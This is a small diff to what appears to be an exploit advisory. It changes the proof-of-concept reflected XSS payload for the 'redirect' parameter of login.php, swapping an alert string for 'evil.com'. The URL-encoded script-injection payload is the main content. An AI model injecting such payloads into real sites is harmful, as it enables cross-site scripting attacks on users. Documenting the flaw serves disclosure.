@@ -10,7 +10,7 @@
 #
 # POC (Piye om carane)
 # https://localhost/login.php?redirect=[Payloads]
-# Payloads: %22%3E%3Cscript%3Ealert(%22Ultraamooz.com%22)%3C/script%3E
+# Payloads: %22%3E%3Cscript%3Ealert(%22evil.com%22)%3C/script%3E
 #
 =========================================================================
 ```
